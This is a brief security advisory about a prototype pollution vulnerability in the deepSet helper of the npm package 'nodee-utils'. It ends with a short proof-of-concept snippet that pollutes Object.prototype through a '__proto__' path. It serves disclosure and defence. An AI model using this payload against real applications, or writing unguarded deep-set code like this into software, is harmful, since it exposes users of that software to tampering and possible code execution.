# Overview
`nodee-utils` is a set of useful helpers, this package are vulnerable to Prototype Pollution via. the `deepSet` function.

# Proof of Concept
```
const { object } = require('nodee-utils');
object.deepSet({}, '__proto__.polluted', true);
console.log(polluted);
```